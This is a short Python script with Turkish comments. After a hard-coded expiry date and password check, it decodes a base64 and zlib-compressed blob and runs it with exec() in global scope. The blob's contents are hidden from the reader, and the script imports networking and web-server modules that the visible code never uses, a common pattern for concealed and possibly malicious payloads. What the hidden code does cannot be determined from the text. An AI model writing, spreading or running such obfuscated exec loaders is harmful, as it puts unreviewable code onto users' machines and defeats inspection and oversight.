import base64, zlib, sys, datetime, os, webbrowser, http.server, socketserver, threading, urllib.request, random

# AYARLAR
S = "tmht@12345"
T = "2027-12-31"

# Veri bütünlüğünü korumak için çok kısa parçalara bölündü
d = [
    'eJx9VWGPozYQ/Z5fYbEfACmYsKu2dwSQ2mtXW13VW+3lpErbqHLABHeN7domYRvtf+8YQja5',
    'bWspgLHnzfi94WXGWiW1RdLM0Z5uNlruDdVz1FirMDzt3MTI8onaaWYbTUnFxHaOOs0522BN',
    '/+qosXOkiahkO/vy8AvKkecwTBrHmuzxltmm23SAUUphqbC4lG18x8qW2vgjEYTHmtYmbgDa',
    'xC1hIiZWtri96bzZrKI1YqJiOgjTGYJh9XP6VXYMU02tZnRHA6hgjrwTQjgE0b6kyqZIEWOG',
    'F7C90wLOjhWxDaY9M9YE52FD5sa2fErMaiSk/Z+QdEK9JdzQIaYBMh69zMEUmTtgkcGpCSob',
    'og21uf9ldRu9849vBWlp7u8Y3TthfHTkK/f3rLJNXtEdK2k0TOZACrOM8MiUhNM88QtvPabE',
    'RCkqqsDLjH3mtNjI6vmwIeXTVstOVOnVYrFYlpJLnV7Vdb20tLcR4Wwr0hKyUf2CcHc4bljU',
    'i2UNZUSG/U3T629Uv1Skci2QXi9U/3Lk9zUp5oeKGcXJc7rVrFq6S2RpC28sjQC1a4VJk1oj',
    '+C23RKWJw0H46aLGJEkuEi03UldURxrarzNDzFh4RUupiWVSpEIKen6wMSRNVA9tzFmFrm5u',
    'bl6yeKQli0c9HD3Fm2NkFduhkkO75H7nFz98/+Hjj58e3qP7h09ZDGvF+QbuTwB76HUkAeKs',
    'L6AbNVyoKKU7Tu51to7eeSEiBtVja7lRS40UqIpq7D6yIMTAIrOBd/XTb6uff71NvfAxSdev',
    'AW4Y1189NtD7KggHjN5hqCn4dwGJoHNPe9YX8bDCoVgTFvn1JbIbpAJ487hYT2hzqCFK1m82',
    'ciaeYKsAQYKgfy3DTKmJtsZxEwzO4IUhkHKk7OtyACp9FaL2MoLAdercP7ilF38i/ckvDqQC',
    'Ocm/qDdKpNAgde4fmwLk94vdNf42ixXoPygPbeA+zrf6genQHrtFp+D+vxUEwfaaWRp4Hv5T',
    'MhE0YXjuMSvd0dFNSDl5iQK2RsfE7saEDb6Dz3KO3sMITz53Imio69yL8erD/efhKYC8c6TC',
    'C+PGn8HcOb1bre4fRo+8gzSc6qFmcyn1ydXxirUAmMwRJ+2mIunZ/wIeWKkH/cDYuQTbaaSx',
    '6UGBCYSjxsGlpGas5g/oB+oqvfRix8Zsxk72jqDCyXDHxX8AgAURAg=='
]

def load():
    # Tarih kontrolü
    if datetime.datetime.now() > datetime.datetime.strptime(T, "%Y-%m-%d"):
        print("Sure doldu."); return
    
    # Şifre kontrolü
    if input("Sifre: ") != S:
        print("Hatali."); return

    try:
        # Kod parçalarını birleştir ve bellekte aç
        full_b64 = "".join(d)
        decoded = zlib.decompress(base64.b64decode(full_b64))
        exec(decoded, globals())
    except Exception as e:
        print(f"Hata: {e}")

if __name__ == "__main__":
    load()
